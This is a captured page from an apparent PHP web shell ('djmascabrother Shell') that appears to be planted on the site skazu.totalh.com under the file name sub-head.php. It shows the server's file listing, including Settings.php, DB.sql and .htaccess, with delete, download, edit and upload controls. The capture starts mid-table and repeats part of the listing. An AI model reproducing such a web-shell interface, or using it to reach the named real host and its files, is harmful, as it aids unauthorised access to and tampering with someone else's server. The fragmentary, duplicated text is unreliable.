                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">sitemap.xml</a></td>
                    <td>Archivo</td>
                    <td>94.43 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">sp-widget.php</a></td>
                    <td>Archivo</td>
                    <td>2.7 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">sub-head.php</a></td>
                    <td>Archivo</td>
                    <td>250.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">validar_char.php</a></td>
                    <td>Archivo</td>
                    <td>352 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">vprevia.php</a></td>
                    <td>Archivo</td>
                    <td>6.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::xtenyou.php">xtenyou.php</a></td>
                    <td>Archivo</td>
                    <td>505.35 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/xtenyou.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/xtenyou.php::xtenyou.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::xtenyou.php">Editar</a>
                    </td>
                    </tr></table><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <link rel="shortcut icon" href="http://skazu.totalh.com/sub-head.php?imagen::icono" />
    <title>djmascabrother Shell en 209.190.24.9</title>
    <style type="text/css">
        *{padding:0;margin:0;border:0;}
        body{background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo1) repeat;font-size:12px;font-family:tahoma;}
        input,select,option{background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo2) repeat-x;font-size:12px;padding:3px;border:solid 1px #369;}
        select,option{height:25px;padding:-2px;border:solid 1px #369;}
        option{border:solid 1px #eee;}
        #menu,#pie,#ext_menu{width:100%;border-bottom:solid 1px #369;background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo2) repeat-x;height:14px;padding:8px 0;text-align:center;}
        #menu a:link,#menu a:visited,#menu a:active,#pie a:link,#pie a:visited,#pie a:active,#pie span,#ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{text-decoration:none;font-weight:bold;color:#369;padding:3px 10px 3px 28px;background-position:2px 2px;}
        #menu a:hover,#pie a:hover,#ext a:hover{padding:1px 9px 1px 27px;border:solid 1px #ddd;background-position:1px 0px;color:#333;}
        #ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{padding:3px 28px 3px 28px;}
        #ext_menu a:hover{padding:1px 27px 1px 27px;border:solid 1px #c90;}
        #pie{border-top:solid 1px #369;}
        #pie input{background:url(http://skazu.totalh.com/sub-head.php?imagen::nombre) 4px 2px no-repeat;padding-left:24px;border:solid 1px #ddd;margin:-4px 10px;width:200px;color:#369;font-weight:bold;}
        #ext_menu{background:url(http://skazu.totalh.com/sub-head.php?imagen::fondo3) repeat-x;}
        #menu_logo,#pie_logo{background:url(http://skazu.totalh.com/sub-head.php?imagen::plugin2) 0px 10px no-repeat;float:left;width:48px;height:40px;display:block;z-index:999;margin-top:-18px;}
        #pie_logo{background:url(http://skazu.totalh.com/sub-head.php?imagen::servidor2) 4px 10px no-repeat;margin-bottom:-18px;overflow:hidden;display:fixed;z-index:999;}
        #guardar{background:url(http://skazu.totalh.com/sub-head.php?imagen::guardar) left no-repeat;}
        #resetear{background:url(http://skazu.totalh.com/sub-head.php?imagen::resetear) left no-repeat;}
        a#inicio{background:url(http://skazu.totalh.com/sub-head.php?imagen::inicio) left no-repeat;}
        a#subir_archivo{background:url(http://skazu.totalh.com/sub-head.php?imagen::subir) left no-repeat;}
        a#crear_carpeta{background:url(http://skazu.totalh.com/sub-head.php?imagen::carpeta) left no-repeat;}
        a#crear_archivo{background:url(http://skazu.totalh.com/sub-head.php?imagen::archivo) left no-repeat;}
        a#borrar{background:url(http://skazu.totalh.com/sub-head.php?imagen::error) left no-repeat;}
        a#descargar{background:url(http://skazu.totalh.com/sub-head.php?imagen::bajar) left no-repeat;}
        a#editar{background:url(http://skazu.totalh.com/sub-head.php?imagen::editar) left no-repeat;}
        a#mysql{background:url(http://skazu.totalh.com/sub-head.php?imagen::mysql) left no-repeat;}
        a#info{background:url(http://skazu.totalh.com/sub-head.php?imagen::info) left no-repeat;}
        a#servidor{background:url(http://skazu.totalh.com/sub-head.php?imagen::servidor) left no-repeat;}
        a#extensiones{background:url(http://skazu.totalh.com/sub-head.php?imagen::plugin) left no-repeat;}
        span#carga{background:url(http://skazu.totalh.com/sub-head.php?imagen::engranaje) left no-repeat;}
        table{margin:0;padding:0;width:100%;border-bottom:solid 1px #369;background:white;border-collapse: collapse;}
        table td{border:solid 1px #eee;color:#555;padding:2px 4px 2px 10px;}
        table tr:hover{background:#eee;}
        textarea{border:none;width:100%;height:500px;overflow:auto;}
        form span {color:#444;font-weight:bold;}
        .opciones{width:350px;}
        .ext_opciones{width:250px;}
        .opciones a:link,.opciones a:visited,.opciones a:active, .ext_opciones a:link,.ext_opciones a:visited,.ext_opciones a:active{padding:2px 18px;text-decoration:none;font-weight:bold;color:#369;background-position:2px 2px;font-size:10px;}
        .opciones a:hover, .ext_opciones a:hover{padding:-5px 9px;background-position:1px 1px;color:#black;}
        .primer_fila{padding-left:10px;font-weight:bold;color:#369;border:solid 1px #369;background:lightblue;}
        .permisos{color:#aaa;}
        .si_permisos{color:green;}
        .no_permisos{color:red;}
        .archivo{background:url(http://skazu.totalh.com/sub-head.php?imagen::archivo) center no-repeat;width:18px;height:18px;}
        .carpeta{background:url(http://skazu.totalh.com/sub-head.php?imagen::carpeta) center no-repeat;width:18px;height:18px;}
        .enlace{background:url(http://skazu.totalh.com/sub-head.php?imagen::enlace) center no-repeat;width:18px;height:18px;}
        .extension{background:url(http://skazu.totalh.com/sub-head.php?imagen::plugin) center no-repeat;width:18px;height:18px;}
        .contenedor,.error,.exito{width:100%;border-bottom:solid 1px #369;background:white;padding:5px 10px;text-align:center;}
        .error{background:#f66;color:white;font-weight:bold;}
        .exito{background:#0c9;color:white;font-weight:bold;}
    </style>
</head>

<body>
<div id="menu">
    <a id="inicio" href="http://skazu.totalh.com/sub-head.php">Inicio</a>
    <a id="subir_archivo" href="?subir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Subir archivo</a>
    <a id="crear_carpeta" href="?crear_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Crear carpeta</a>
    <a id="extensiones" href="?extensiones::inicio">Extensiones</a>
    <a id="info" href="?codigo"></a>
    </div><div id="ext_menu">
            <div id="menu_logo"></div><span> No hay ninguna extensión instalada aún.</span></div><table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages">Packages</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys">Smileys</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources">Sources</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes">Themes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web">web</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>206 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">.htaccess.backup</a></td>
                    <td>Archivo</td>
                    <td>787 B</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>45 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">DB.sql</a></td>
                    <td>Archivo</td>
                    <td>51.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">SSI.php</a></td>
                    <td>Archivo</td>
                    <td>12.13 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Settings.php</a></td>
                    <td>Archivo</td>
                    <td>1016 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">SourcesSubs.php</a></td>
                    <td>Archivo</td>
                    <td>144.45 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">add_comment.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.96 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">favicon.ico</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>11.18 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">php.ini</a></td>
                    <td>Archivo</td>
                    <td>47 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">robots.txt</a></td>
                    <td>Archivo</td>
                    <td>244 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/robots.txt::robots.txt::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">sitemap.xml</a></td>
                    <td>Archivo</td>
                    <td>94.43 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sitemap.xml::sitemap.xml::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
